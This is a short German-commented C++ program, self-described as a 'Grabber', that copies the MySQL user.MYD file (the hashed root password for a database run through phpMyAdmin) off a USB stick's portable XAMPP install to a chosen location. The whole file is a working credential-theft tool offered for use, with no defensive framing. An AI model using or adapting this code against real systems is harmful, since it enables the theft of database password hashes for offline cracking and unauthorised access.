/*	Grabber zum Auslesen der Datei user.MYD mit
	dem Inhalt des hashed root-Passworts von PHPmyAdmin
	C++ 2012
*/

#include <iostream>
#include <string>
#include <stdio.h>
#include <Windows.h>
using namespace std;

int main()
{
	string speicherpfad;
	cout << "Speicherpfad:" << endl;
	cin >> speicherpfad;
	speicherpfad += "user.MYD";
	string laufwerkbuchstabe;
	cout << "Laufwerkbuchstabe des Sticks:" << endl;
	cin >> laufwerkbuchstabe;
	laufwerkbuchstabe += "/Programme/xampplite/mysql/data/mysql/user.MYD";

	FILE * datei = fopen(laufwerkbuchstabe.c_str(), "r");
	if(datei == NULL)
	{
		cout << "\n\aERROR: user.MYD existiert an diesem Ort nicht!" << endl;
		system("PAUSE");
	}
	else
	{
		CopyFileA(laufwerkbuchstabe.c_str(), speicherpfad.c_str(), FALSE);
		cout << "\nKopiervorgang war erfolgreich." << endl;
		system("PAUSE");
		return 0;
	}
}
